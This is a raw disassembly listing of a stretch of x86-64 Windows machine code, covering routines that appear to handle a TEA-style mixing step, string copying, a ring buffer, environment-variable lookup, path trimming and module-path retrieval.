  4072a5:	c1 ea 03             	shr    $0x3,%edx
  4072a8:	45 31 c2             	xor    %r8d,%r10d
  4072ab:	41 8d 04 0a          	lea    (%r10,%rcx,1),%eax
  4072af:	44 89 c1             	mov    %r8d,%ecx
  4072b2:	41 c1 e0 04          	shl    $0x4,%r8d
  4072b6:	c1 e9 05             	shr    $0x5,%ecx
  4072b9:	44 31 c2             	xor    %r8d,%edx
  4072bc:	44 31 c9             	xor    %r9d,%ecx
  4072bf:	01 ca                	add    %ecx,%edx
  4072c1:	31 d0                	xor    %edx,%eax
  4072c3:	c3                   	ret
  4072c4:	55                   	push   %rbp
  4072c5:	57                   	push   %rdi
  4072c6:	56                   	push   %rsi
  4072c7:	53                   	push   %rbx
  4072c8:	48 83 ec 28          	sub    $0x28,%rsp
  4072cc:	48 8d 05 4d f6 00 00 	lea    0xf64d(%rip),%rax        # 0x416920
  4072d3:	45 0f b6 c0          	movzbl %r8b,%r8d
  4072d7:	48 89 ce             	mov    %rcx,%rsi
  4072da:	48 89 d5             	mov    %rdx,%rbp
  4072dd:	4a 8b 0c c0          	mov    (%rax,%r8,8),%rcx
  4072e1:	e8 06 b7 ff ff       	call   0x4029ec
  4072e6:	48 89 e9             	mov    %rbp,%rcx
  4072e9:	31 ed                	xor    %ebp,%ebp
  4072eb:	48 89 c3             	mov    %rax,%rbx
  4072ee:	e8 f9 b6 ff ff       	call   0x4029ec
  4072f3:	48 85 c0             	test   %rax,%rax
  4072f6:	49 89 c0             	mov    %rax,%r8
  4072f9:	74 1d                	je     0x407318
  4072fb:	31 c0                	xor    %eax,%eax
  4072fd:	4c 89 c7             	mov    %r8,%rdi
  407300:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  407304:	f2 ae                	repnz scas (%rdi),%al
  407306:	48 f7 d1             	not    %rcx
  407309:	48 8d 51 ff          	lea    -0x1(%rcx),%rdx
  40730d:	4c 89 c1             	mov    %r8,%rcx
  407310:	e8 8e af ff ff       	call   0x4022a3
  407315:	48 89 c5             	mov    %rax,%rbp
  407318:	31 c0                	xor    %eax,%eax
  40731a:	48 85 db             	test   %rbx,%rbx
  40731d:	74 18                	je     0x407337
  40731f:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  407323:	48 89 df             	mov    %rbx,%rdi
  407326:	f2 ae                	repnz scas (%rdi),%al
  407328:	48 f7 d1             	not    %rcx
  40732b:	48 8d 51 ff          	lea    -0x1(%rcx),%rdx
  40732f:	48 89 d9             	mov    %rbx,%rcx
  407332:	e8 6c af ff ff       	call   0x4022a3
  407337:	48 89 c2             	mov    %rax,%rdx
  40733a:	48 89 e9             	mov    %rbp,%rcx
  40733d:	ff 15 91 41 03 00    	call   *0x34191(%rip)        # 0x43b4d4
  407343:	31 d2                	xor    %edx,%edx
  407345:	48 85 c0             	test   %rax,%rax
  407348:	74 05                	je     0x40734f
  40734a:	48 89 06             	mov    %rax,(%rsi)
  40734d:	b2 01                	mov    $0x1,%dl
  40734f:	88 d0                	mov    %dl,%al
  407351:	48 83 c4 28          	add    $0x28,%rsp
  407355:	5b                   	pop    %rbx
  407356:	5e                   	pop    %rsi
  407357:	5f                   	pop    %rdi
  407358:	5d                   	pop    %rbp
  407359:	c3                   	ret
  40735a:	41 55                	push   %r13
  40735c:	41 54                	push   %r12
  40735e:	55                   	push   %rbp
  40735f:	57                   	push   %rdi
  407360:	56                   	push   %rsi
  407361:	53                   	push   %rbx
  407362:	48 83 ec 38          	sub    $0x38,%rsp
  407366:	48 83 3d 2a 03 02 00 	cmpq   $0xfffffffffffffffe,0x2032a(%rip)        # 0x427698
  40736d:	fe 
  40736e:	49 89 cc             	mov    %rcx,%r12
  407371:	75 70                	jne    0x4073e3
  407373:	48 8d 0d 86 02 02 00 	lea    0x20286(%rip),%rcx        # 0x427600
  40737a:	ba 30 00 00 00       	mov    $0x30,%edx
  40737f:	e8 be de ff ff       	call   0x405242
  407384:	48 8d 0d 55 f5 00 00 	lea    0xf555(%rip),%rcx        # 0x4168e0
  40738b:	48 89 c3             	mov    %rax,%rbx
  40738e:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  407392:	48 8d 05 27 02 02 00 	lea    0x20227(%rip),%rax        # 0x4275c0
  407399:	48 89 03             	mov    %rax,(%rbx)
  40739c:	48 8d 05 3f f4 00 00 	lea    0xf43f(%rip),%rax        # 0x4167e2
  4073a3:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4073a7:	e8 ee dd ff ff       	call   0x40519a
  4073ac:	48 85 f6             	test   %rsi,%rsi
  4073af:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4073b3:	74 08                	je     0x4073bd
  4073b5:	48 89 f1             	mov    %rsi,%rcx
  4073b8:	e8 43 69 00 00       	call   0x40dd00
  4073bd:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  4073c4:	00 00 
  4073c6:	4c 8d 0d 25 f4 00 00 	lea    0xf425(%rip),%r9        # 0x4167f2
  4073cd:	48 89 d9             	mov    %rbx,%rcx
  4073d0:	4c 8d 05 25 f4 00 00 	lea    0xf425(%rip),%r8        # 0x4167fc
  4073d7:	48 8d 15 04 f4 00 00 	lea    0xf404(%rip),%rdx        # 0x4167e2
  4073de:	e8 d2 e7 ff ff       	call   0x405bb5
  4073e3:	48 8d 0d c6 02 02 00 	lea    0x202c6(%rip),%rcx        # 0x4276b0
  4073ea:	ff 15 24 3f 03 00    	call   *0x33f24(%rip)        # 0x43b314
  4073f0:	48 83 3d a8 02 02 00 	cmpq   $0x0,0x202a8(%rip)        # 0x4276a0
  4073f7:	00 
  4073f8:	7e 21                	jle    0x40741b
  4073fa:	48 8d 1d d7 02 02 00 	lea    0x202d7(%rip),%rbx        # 0x4276d8
  407401:	48 8b 05 88 02 02 00 	mov    0x20288(%rip),%rax        # 0x427690
  407408:	48 39 05 91 02 02 00 	cmp    %rax,0x20291(%rip)        # 0x4276a0
  40740f:	7f 0a                	jg     0x40741b
  407411:	48 89 d9             	mov    %rbx,%rcx
  407414:	e8 58 fa ff ff       	call   0x406e71
  407419:	eb e6                	jmp    0x407401
  40741b:	48 8b 05 76 02 02 00 	mov    0x20276(%rip),%rax        # 0x427698
  407422:	48 8d 2d 17 02 02 00 	lea    0x20217(%rip),%rbp        # 0x427640
  407429:	48 8d 58 01          	lea    0x1(%rax),%rbx
  40742d:	48 3b 1d 5c 02 02 00 	cmp    0x2025c(%rip),%rbx        # 0x427690
  407434:	0f 8f b7 00 00 00    	jg     0x4074f1
  40743a:	48 8d 0d af 02 02 00 	lea    0x202af(%rip),%rcx        # 0x4276f0
  407441:	48 85 db             	test   %rbx,%rbx
  407444:	b8 01 00 00 00       	mov    $0x1,%eax
  407449:	48 0f 44 d8          	cmove  %rax,%rbx
  40744d:	48 01 db             	add    %rbx,%rbx
  407450:	48 89 da             	mov    %rbx,%rdx
  407453:	48 0f af 15 e5 01 02 	imul   0x201e5(%rip),%rdx        # 0x427640
  40745a:	00 
  40745b:	e8 cf ab ff ff       	call   0x40202f
  407460:	4c 8b 05 19 02 02 00 	mov    0x20219(%rip),%r8        # 0x427680
  407467:	45 31 c9             	xor    %r9d,%r9d
  40746a:	4c 8b 15 1f 02 02 00 	mov    0x2021f(%rip),%r10        # 0x427690
  407471:	49 89 c5             	mov    %rax,%r13
  407474:	4c 89 d0             	mov    %r10,%rax
  407477:	48 8b 15 2a 02 02 00 	mov    0x2022a(%rip),%rdx        # 0x4276a8
  40747e:	4c 29 c8             	sub    %r9,%rax
  407481:	48 85 c0             	test   %rax,%rax
  407484:	7e 2c                	jle    0x4074b2
  407486:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  40748a:	48 89 c8             	mov    %rcx,%rax
  40748d:	48 89 ce             	mov    %rcx,%rsi
  407490:	49 0f af c1          	imul   %r9,%rax
  407494:	49 ff c1             	inc    %r9
  407497:	49 0f af f0          	imul   %r8,%rsi
  40749b:	49 ff c0             	inc    %r8
  40749e:	4c 01 e8             	add    %r13,%rax
  4074a1:	48 01 d6             	add    %rdx,%rsi
  4074a4:	48 89 c7             	mov    %rax,%rdi
  4074a7:	f3 a4                	rep movsb (%rsi),(%rdi)
  4074a9:	4c 23 05 e8 01 02 00 	and    0x201e8(%rip),%r8        # 0x427698
  4074b0:	eb c2                	jmp    0x407474
  4074b2:	48 85 d2             	test   %rdx,%rdx
  4074b5:	74 10                	je     0x4074c7
  4074b7:	48 8d 0d 32 02 02 00 	lea    0x20232(%rip),%rcx        # 0x4276f0
  4074be:	48 83 ea 10          	sub    $0x10,%rdx
  4074c2:	e8 6b c2 ff ff       	call   0x403732
  4074c7:	48 8b 05 c2 01 02 00 	mov    0x201c2(%rip),%rax        # 0x427690
  4074ce:	48 ff cb             	dec    %rbx
  4074d1:	4c 89 2d d0 01 02 00 	mov    %r13,0x201d0(%rip)        # 0x4276a8
  4074d8:	48 89 1d b9 01 02 00 	mov    %rbx,0x201b9(%rip)        # 0x427698
  4074df:	48 c7 05 96 01 02 00 	movq   $0x0,0x20196(%rip)        # 0x427680
  4074e6:	00 00 00 00 
  4074ea:	48 89 05 97 01 02 00 	mov    %rax,0x20197(%rip)        # 0x427688
  4074f1:	48 8b 0d 90 01 02 00 	mov    0x20190(%rip),%rcx        # 0x427688
  4074f8:	45 31 c9             	xor    %r9d,%r9d
  4074fb:	4c 89 e2             	mov    %r12,%rdx
  4074fe:	48 0f af 0d 3a 01 02 	imul   0x2013a(%rip),%rcx        # 0x427640
  407505:	00 
  407506:	48 03 0d 9b 01 02 00 	add    0x2019b(%rip),%rcx        # 0x4276a8
  40750d:	4c 8d 05 2c 01 02 00 	lea    0x2012c(%rip),%r8        # 0x427640
  407514:	e8 8c f9 ff ff       	call   0x406ea5
  407519:	48 8b 05 68 01 02 00 	mov    0x20168(%rip),%rax        # 0x427688
  407520:	48 89 2d b9 01 02 00 	mov    %rbp,0x201b9(%rip)        # 0x4276e0
  407527:	48 8d 0d 82 01 02 00 	lea    0x20182(%rip),%rcx        # 0x4276b0
  40752e:	48 ff 05 5b 01 02 00 	incq   0x2015b(%rip)        # 0x427690
  407535:	48 ff c0             	inc    %rax
  407538:	48 23 05 59 01 02 00 	and    0x20159(%rip),%rax        # 0x427698
  40753f:	48 89 05 42 01 02 00 	mov    %rax,0x20142(%rip)        # 0x427688
  407546:	ff 15 20 3e 03 00    	call   *0x33e20(%rip)        # 0x43b36c
  40754c:	48 8b 0d 85 01 02 00 	mov    0x20185(%rip),%rcx        # 0x4276d8
  407553:	ff 15 1f 01 02 00    	call   *0x2011f(%rip)        # 0x427678
  407559:	b0 01                	mov    $0x1,%al
  40755b:	48 83 c4 38          	add    $0x38,%rsp
  40755f:	5b                   	pop    %rbx
  407560:	5e                   	pop    %rsi
  407561:	5f                   	pop    %rdi
  407562:	5d                   	pop    %rbp
  407563:	41 5c                	pop    %r12
  407565:	41 5d                	pop    %r13
  407567:	c3                   	ret
  407568:	41 57                	push   %r15
  40756a:	41 56                	push   %r14
  40756c:	41 55                	push   %r13
  40756e:	41 54                	push   %r12
  407570:	55                   	push   %rbp
  407571:	57                   	push   %rdi
  407572:	56                   	push   %rsi
  407573:	53                   	push   %rbx
  407574:	48 83 ec 38          	sub    $0x38,%rsp
  407578:	48 89 ce             	mov    %rcx,%rsi
  40757b:	e8 97 b5 ff ff       	call   0x402b17
  407580:	49 89 c5             	mov    %rax,%r13
  407583:	e8 8f b5 ff ff       	call   0x402b17
  407588:	49 89 c6             	mov    %rax,%r14
  40758b:	e8 87 b5 ff ff       	call   0x402b17
  407590:	80 b8 50 34 00 00 00 	cmpb   $0x0,0x3450(%rax)
  407597:	48 89 c3             	mov    %rax,%rbx
  40759a:	0f 85 bb 00 00 00    	jne    0x40765b
  4075a0:	4c 8d a0 58 34 00 00 	lea    0x3458(%rax),%r12
  4075a7:	31 d2                	xor    %edx,%edx
  4075a9:	4c 89 e1             	mov    %r12,%rcx
  4075ac:	e8 c8 dd ff ff       	call   0x405379
  4075b1:	ff 15 01 00 02 00    	call   *0x20001(%rip)        # 0x4275b8
  4075b7:	48 85 c0             	test   %rax,%rax
  4075ba:	48 89 c7             	mov    %rax,%rdi
  4075bd:	0f 84 98 00 00 00    	je     0x40765b
  4075c3:	49 89 c7             	mov    %rax,%r15
  4075c6:	31 d2                	xor    %edx,%edx
  4075c8:	4c 89 f9             	mov    %r15,%rcx
  4075cb:	e8 90 3f 00 00       	call   0x40b560
  4075d0:	4c 89 f9             	mov    %r15,%rcx
  4075d3:	48 89 c5             	mov    %rax,%rbp
  4075d6:	e8 5f ae ff ff       	call   0x40243a
  4075db:	48 8b 8b 58 34 00 00 	mov    0x3458(%rbx),%rcx
  4075e2:	48 8d 15 97 ff 01 00 	lea    0x1ff97(%rip),%rdx        # 0x427580
  4075e9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  4075ee:	e8 32 e8 ff ff       	call   0x405e25
  4075f3:	4c 89 e1             	mov    %r12,%rcx
  4075f6:	48 89 c2             	mov    %rax,%rdx
  4075f9:	e8 7b dd ff ff       	call   0x405379
  4075fe:	48 8b 83 58 34 00 00 	mov    0x3458(%rbx),%rax
  407605:	48 8b 10             	mov    (%rax),%rdx
  407608:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
  40760c:	48 89 08             	mov    %rcx,(%rax)
  40760f:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  407614:	4c 8d 04 d0          	lea    (%rax,%rdx,8),%r8
  407618:	4d 8b 78 10          	mov    0x10(%r8),%r15
  40761c:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  407621:	e8 74 db ff ff       	call   0x40519a
  407626:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  40762b:	4d 85 ff             	test   %r15,%r15
  40762e:	49 89 40 10          	mov    %rax,0x10(%r8)
  407632:	74 08                	je     0x40763c
  407634:	4c 89 f9             	mov    %r15,%rcx
  407637:	e8 c4 66 00 00       	call   0x40dd00
  40763c:	66 83 7d 02 00       	cmpw   $0x0,0x2(%rbp)
  407641:	4c 8d 7d 02          	lea    0x2(%rbp),%r15
  407645:	0f 85 7b ff ff ff    	jne    0x4075c6
  40764b:	48 89 f9             	mov    %rdi,%rcx
  40764e:	ff 15 0c ff 01 00    	call   *0x1ff0c(%rip)        # 0x427560
  407654:	c6 83 50 34 00 00 01 	movb   $0x1,0x3450(%rbx)
  40765b:	48 85 f6             	test   %rsi,%rsi
  40765e:	b9 01 00 00 00       	mov    $0x1,%ecx
  407663:	74 07                	je     0x40766c
  407665:	48 8b 06             	mov    (%rsi),%rax
  407668:	48 8d 48 01          	lea    0x1(%rax),%rcx
  40766c:	e8 0f dc ff ff       	call   0x405280
  407671:	48 89 f2             	mov    %rsi,%rdx
  407674:	48 89 c5             	mov    %rax,%rbp
  407677:	48 89 c1             	mov    %rax,%rcx
  40767a:	e8 a8 e9 ff ff       	call   0x406027
  40767f:	48 8b 55 00          	mov    0x0(%rbp),%rdx
  407683:	c6 44 15 10 3d       	movb   $0x3d,0x10(%rbp,%rdx,1)
  407688:	48 ff c2             	inc    %rdx
  40768b:	c6 44 15 10 00       	movb   $0x0,0x10(%rbp,%rdx,1)
  407690:	4d 8b 9e 58 34 00 00 	mov    0x3458(%r14),%r11
  407697:	48 89 55 00          	mov    %rdx,0x0(%rbp)
  40769b:	4d 85 db             	test   %r11,%r11
  40769e:	0f 84 d9 00 00 00    	je     0x40777d
  4076a4:	49 8b 03             	mov    (%r11),%rax
  4076a7:	45 31 c0             	xor    %r8d,%r8d
  4076aa:	48 8d 58 ff          	lea    -0x1(%rax),%rbx
  4076ae:	4c 39 c3             	cmp    %r8,%rbx
  4076b1:	0f 8c c6 00 00 00    	jl     0x40777d
  4076b7:	4b 8b 7c c3 10       	mov    0x10(%r11,%r8,8),%rdi
  4076bc:	31 c9                	xor    %ecx,%ecx
  4076be:	48 85 ff             	test   %rdi,%rdi
  4076c1:	74 3e                	je     0x407701
  4076c3:	48 3b 0f             	cmp    (%rdi),%rcx
  4076c6:	7d 39                	jge    0x407701
  4076c8:	48 39 ca             	cmp    %rcx,%rdx
  4076cb:	7e 34                	jle    0x407701
  4076cd:	44 8a 4c 0f 10       	mov    0x10(%rdi,%rcx,1),%r9b
  4076d2:	45 8d 51 bf          	lea    -0x41(%r9),%r10d
  4076d6:	41 8d 41 20          	lea    0x20(%r9),%eax
  4076da:	41 80 fa 19          	cmp    $0x19,%r10b
  4076de:	44 8a 54 0d 10       	mov    0x10(%rbp,%rcx,1),%r10b
  4076e3:	44 0f 46 c8          	cmovbe %eax,%r9d
  4076e7:	45 8d 62 bf          	lea    -0x41(%r10),%r12d
  4076eb:	41 8d 42 20          	lea    0x20(%r10),%eax
  4076ef:	41 80 fc 19          	cmp    $0x19,%r12b
  4076f3:	44 0f 46 d0          	cmovbe %eax,%r10d
  4076f7:	45 38 ca             	cmp    %r9b,%r10b
  4076fa:	75 05                	jne    0x407701
  4076fc:	48 ff c1             	inc    %rcx
  4076ff:	eb bd                	jmp    0x4076be
  407701:	48 39 ca             	cmp    %rcx,%rdx
  407704:	74 05                	je     0x40770b
  407706:	48 85 d2             	test   %rdx,%rdx
  407709:	75 1e                	jne    0x407729
  40770b:	49 8b 85 58 34 00 00 	mov    0x3458(%r13),%rax
  407712:	4a 8b 5c c0 10       	mov    0x10(%rax,%r8,8),%rbx
  407717:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
  40771b:	48 85 db             	test   %rbx,%rbx
  40771e:	74 0e                	je     0x40772e
  407720:	48 8b 03             	mov    (%rbx),%rax
  407723:	4c 8d 40 ff          	lea    -0x1(%rax),%r8
  407727:	eb 05                	jmp    0x40772e
  407729:	49 ff c0             	inc    %r8
  40772c:	eb 80                	jmp    0x4076ae
  40772e:	49 ff c0             	inc    %r8
  407731:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  407735:	4d 85 c0             	test   %r8,%r8
  407738:	7e 28                	jle    0x407762
  40773a:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  40773e:	ba 3d 00 00 00       	mov    $0x3d,%edx
  407743:	e8 c8 40 00 00       	call   0x40b810
  407748:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  40774c:	48 85 c0             	test   %rax,%rax
  40774f:	48 89 c6             	mov    %rax,%rsi
  407752:	74 0e                	je     0x407762
  407754:	48 89 d9             	mov    %rbx,%rcx
  407757:	e8 90 b2 ff ff       	call   0x4029ec
  40775c:	48 29 c6             	sub    %rax,%rsi
  40775f:	48 89 f2             	mov    %rsi,%rdx
  407762:	48 ff c2             	inc    %rdx
  407765:	48 89 d9             	mov    %rbx,%rcx
  407768:	48 83 c4 38          	add    $0x38,%rsp
  40776c:	5b                   	pop    %rbx
  40776d:	5e                   	pop    %rsi
  40776e:	5f                   	pop    %rdi
  40776f:	5d                   	pop    %rbp
  407770:	41 5c                	pop    %r12
  407772:	41 5d                	pop    %r13
  407774:	41 5e                	pop    %r14
  407776:	41 5f                	pop    %r15
  407778:	e9 4f 14 00 00       	jmp    0x408bcc
  40777d:	48 89 f1             	mov    %rsi,%rcx
  407780:	e8 67 b2 ff ff       	call   0x4029ec
  407785:	48 89 c1             	mov    %rax,%rcx
  407788:	e8 23 3e 00 00       	call   0x40b5b0
  40778d:	48 85 c0             	test   %rax,%rax
  407790:	74 18                	je     0x4077aa
  407792:	48 89 c1             	mov    %rax,%rcx
  407795:	48 83 c4 38          	add    $0x38,%rsp
  407799:	5b                   	pop    %rbx
  40779a:	5e                   	pop    %rsi
  40779b:	5f                   	pop    %rdi
  40779c:	5d                   	pop    %rbp
  40779d:	41 5c                	pop    %r12
  40779f:	41 5d                	pop    %r13
  4077a1:	41 5e                	pop    %r14
  4077a3:	41 5f                	pop    %r15
  4077a5:	e9 6e 22 00 00       	jmp    0x409a18
  4077aa:	31 c0                	xor    %eax,%eax
  4077ac:	48 83 c4 38          	add    $0x38,%rsp
  4077b0:	5b                   	pop    %rbx
  4077b1:	5e                   	pop    %rsi
  4077b2:	5f                   	pop    %rdi
  4077b3:	5d                   	pop    %rbp
  4077b4:	41 5c                	pop    %r12
  4077b6:	41 5d                	pop    %r13
  4077b8:	41 5e                	pop    %r14
  4077ba:	41 5f                	pop    %r15
  4077bc:	c3                   	ret
  4077bd:	90                   	nop
  4077be:	90                   	nop
  4077bf:	90                   	nop
  4077c0:	53                   	push   %rbx
  4077c1:	48 83 ec 20          	sub    $0x20,%rsp
  4077c5:	48 89 cb             	mov    %rcx,%rbx
  4077c8:	48 8b 09             	mov    (%rcx),%rcx
  4077cb:	41 89 d0             	mov    %edx,%r8d
  4077ce:	48 85 c9             	test   %rcx,%rcx
  4077d1:	0f 84 83 00 00 00    	je     0x40785a
  4077d7:	48 8b 01             	mov    (%rcx),%rax
  4077da:	48 85 c0             	test   %rax,%rax
  4077dd:	48 89 c2             	mov    %rax,%rdx
  4077e0:	74 78                	je     0x40785a
  4077e2:	48 85 d2             	test   %rdx,%rdx
  4077e5:	7e 52                	jle    0x407839
  4077e7:	8a 44 11 0f          	mov    0xf(%rcx,%rdx,1),%al
  4077eb:	3c 5c                	cmp    $0x5c,%al
  4077ed:	75 05                	jne    0x4077f4
  4077ef:	48 ff ca             	dec    %rdx
  4077f2:	eb ee                	jmp    0x4077e2
  4077f4:	3c 2f                	cmp    $0x2f,%al
  4077f6:	74 f7                	je     0x4077ef
  4077f8:	3c 2e                	cmp    $0x2e,%al
  4077fa:	75 12                	jne    0x40780e
  4077fc:	48 83 fa 01          	cmp    $0x1,%rdx
  407800:	7e 0c                	jle    0x40780e
  407802:	8a 44 11 0e          	mov    0xe(%rcx,%rdx,1),%al
  407806:	3c 5c                	cmp    $0x5c,%al
  407808:	74 e5                	je     0x4077ef
  40780a:	3c 2f                	cmp    $0x2f,%al
  40780c:	74 e1                	je     0x4077ef
  40780e:	45 84 c0             	test   %r8b,%r8b
  407811:	74 1f                	je     0x407832
  407813:	e8 b1 da ff ff       	call   0x4052c9
  407818:	48 89 d9             	mov    %rbx,%rcx
  40781b:	48 89 c2             	mov    %rax,%rdx
  40781e:	e8 56 db ff ff       	call   0x405379
  407823:	48 8b 0b             	mov    (%rbx),%rcx
  407826:	ba 5c 00 00 00       	mov    $0x5c,%edx
  40782b:	e8 62 d8 ff ff       	call   0x405092
  407830:	eb 18                	jmp    0x40784a
  407832:	e8 92 da ff ff       	call   0x4052c9
  407837:	eb 11                	jmp    0x40784a
  407839:	45 84 c0             	test   %r8b,%r8b
  40783c:	75 d5                	jne    0x407813
  40783e:	48 8d 0d 8b f2 00 00 	lea    0xf28b(%rip),%rcx        # 0x416ad0
  407845:	e8 93 13 00 00       	call   0x408bdd
  40784a:	48 89 c2             	mov    %rax,%rdx
  40784d:	48 89 d9             	mov    %rbx,%rcx
  407850:	48 83 c4 20          	add    $0x20,%rsp
  407854:	5b                   	pop    %rbx
  407855:	e9 1f db ff ff       	jmp    0x405379
  40785a:	48 83 c4 20          	add    $0x20,%rsp
  40785e:	5b                   	pop    %rbx
  40785f:	c3                   	ret
  407860:	57                   	push   %rdi
  407861:	56                   	push   %rsi
  407862:	53                   	push   %rbx
  407863:	48 83 ec 20          	sub    $0x20,%rsp
  407867:	31 db                	xor    %ebx,%ebx
  407869:	48 89 ce             	mov    %rcx,%rsi
  40786c:	0f b6 fa             	movzbl %dl,%edi
  40786f:	48 85 f6             	test   %rsi,%rsi
  407872:	74 16                	je     0x40788a
  407874:	48 3b 1e             	cmp    (%rsi),%rbx
  407877:	7d 11                	jge    0x40788a
  407879:	48 8b 4c de 10       	mov    0x10(%rsi,%rbx,8),%rcx
  40787e:	89 fa                	mov    %edi,%edx
  407880:	48 ff c3             	inc    %rbx
  407883:	e8 af c4 ff ff       	call   0x403d37
  407888:	eb e5                	jmp    0x40786f
  40788a:	48 83 c4 20          	add    $0x20,%rsp
  40788e:	5b                   	pop    %rbx
  40788f:	5e                   	pop    %rsi
  407890:	5f                   	pop    %rdi
  407891:	c3                   	ret
  407892:	56                   	push   %rsi
  407893:	53                   	push   %rbx
  407894:	48 83 ec 28          	sub    $0x28,%rsp
  407898:	48 89 ce             	mov    %rcx,%rsi
  40789b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  40789f:	0f b6 da             	movzbl %dl,%ebx
  4078a2:	89 da                	mov    %ebx,%edx
  4078a4:	e8 8e c4 ff ff       	call   0x403d37
  4078a9:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  4078ad:	89 da                	mov    %ebx,%edx
  4078af:	e8 83 c4 ff ff       	call   0x403d37
  4078b4:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  4078b8:	89 da                	mov    %ebx,%edx
  4078ba:	48 83 c4 28          	add    $0x28,%rsp
  4078be:	5b                   	pop    %rbx
  4078bf:	5e                   	pop    %rsi
  4078c0:	e9 72 c4 ff ff       	jmp    0x403d37
  4078c5:	56                   	push   %rsi
  4078c6:	53                   	push   %rbx
  4078c7:	48 83 ec 28          	sub    $0x28,%rsp
  4078cb:	48 89 ce             	mov    %rcx,%rsi
  4078ce:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  4078d2:	0f b6 da             	movzbl %dl,%ebx
  4078d5:	89 da                	mov    %ebx,%edx
  4078d7:	e8 5b c4 ff ff       	call   0x403d37
  4078dc:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  4078e0:	89 da                	mov    %ebx,%edx
  4078e2:	e8 50 c4 ff ff       	call   0x403d37
  4078e7:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  4078eb:	89 da                	mov    %ebx,%edx
  4078ed:	e8 45 c4 ff ff       	call   0x403d37
  4078f2:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  4078f6:	89 da                	mov    %ebx,%edx
  4078f8:	48 83 c4 28          	add    $0x28,%rsp
  4078fc:	5b                   	pop    %rbx
  4078fd:	5e                   	pop    %rsi
  4078fe:	e9 34 c4 ff ff       	jmp    0x403d37
  407903:	eb c0                	jmp    0x4078c5
  407905:	48 83 ec 28          	sub    $0x28,%rsp
  407909:	e8 14 ad ff ff       	call   0x402622
  40790e:	48 89 c1             	mov    %rax,%rcx
  407911:	48 8b 05 28 f8 00 00 	mov    0xf828(%rip),%rax        # 0x417140
  407918:	ff 10                	call   *(%rax)
  40791a:	89 c2                	mov    %eax,%edx
  40791c:	31 c0                	xor    %eax,%eax
  40791e:	83 fa ff             	cmp    $0xffffffff,%edx
  407921:	74 08                	je     0x40792b
  407923:	c1 ea 04             	shr    $0x4,%edx
  407926:	88 d0                	mov    %dl,%al
  407928:	83 e0 01             	and    $0x1,%eax
  40792b:	48 83 c4 28          	add    $0x28,%rsp
  40792f:	c3                   	ret
  407930:	55                   	push   %rbp
  407931:	57                   	push   %rdi
  407932:	56                   	push   %rsi
  407933:	53                   	push   %rbx
  407934:	48 83 ec 28          	sub    $0x28,%rsp
  407938:	ba 04 01 00 00       	mov    $0x104,%edx
  40793d:	bf 04 01 00 00       	mov    $0x104,%edi
  407942:	48 8d 0d 17 f0 00 00 	lea    0xf017(%rip),%rcx        # 0x416960
  407949:	48 8d 2d 10 f0 00 00 	lea    0xf010(%rip),%rbp        # 0x416960
  407950:	e8 4e a9 ff ff       	call   0x4022a3
  407955:	48 89 c6             	mov    %rax,%rsi
  407958:	48 8b 05 a1 f7 00 00 	mov    0xf7a1(%rip),%rax        # 0x417100
  40795f:	31 c9                	xor    %ecx,%ecx
  407961:	41 89 f8             	mov    %edi,%r8d
  407964:	48 89 f2             	mov    %rsi,%rdx
  407967:	ff 10                	call   *(%rax)
  407969:	85 c0                	test   %eax,%eax
  40796b:	89 c3                	mov    %eax,%ebx
  40796d:	74 26                	je     0x407995
  40796f:	39 c7                	cmp    %eax,%edi
  407971:	48 63 d0             	movslq %eax,%rdx
  407974:	7d 0f                	jge    0x407985
  407976:	48 89 e9             	mov    %rbp,%rcx
  407979:	89 df                	mov    %ebx,%edi
  40797b:	e8 23 a9 ff ff       	call   0x4022a3
  407980:	48 89 c6             	mov    %rax,%rsi
  407983:	eb d3                	jmp    0x407958
  407985:	48 89 f1             	mov    %rsi,%rcx
  407988:	48 83 c4 28          	add    $0x28,%rsp
  40798c:	5b                   	pop    %rbx
  40798d:	5e                   	pop    %rsi
  40798e:	5f                   	pop    %rdi
  40798f:	5d                   	pop    %rbp
  407990:	e9 ab f2 ff ff       	jmp    0x406c40
  407995:	31 c0                	xor    %eax,%eax
  407997:	48 83 c4 28          	add    $0x28,%rsp
  40799b:	5b                   	pop    %rbx
  40799c:	5e                   	pop    %rsi
  40799d:	5f                   	pop    %rdi
  40799e:	5d                   	pop    %rbp
  40799f:	c3                   	ret
  4079a0:	48 8b 05 29 f7 00 00 	mov    0xf729(%rip),%rax        # 0x4170d0
  4079a7:	48 ff 20             	rex.W jmp *(%rax)
  4079aa:	48 83 ec 28          	sub    $0x28,%rsp
  4079ae:	31 d2                	xor    %edx,%edx
  4079b0:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
  4079b6:	ff 15 38 3a 03 00    	call   *0x33a38(%rip)        # 0x43b3f4
  4079bc:	85 c0                	test   %eax,%eax
  4079be:	75 17                	jne    0x4079d7
  4079c0:	48 8d 0d da ef 00 00 	lea    0xefda(%rip),%rcx        # 0x4169a1
  4079c7:	e8 34 3e 00 00       	call   0x40b800
  4079cc:	b9 01 00 00 00       	mov    $0x1,%ecx
  4079d1:	e8 32 3c 00 00       	call   0x40b608
  4079d6:	90                   	nop
  4079d7:	48 83 c4 28          	add    $0x28,%rsp
  4079db:	c3                   	ret
  4079dc:	57                   	push   %rdi
  4079dd:	56                   	push   %rsi
  4079de:	53                   	push   %rbx
  4079df:	48 83 ec 40          	sub    $0x40,%rsp
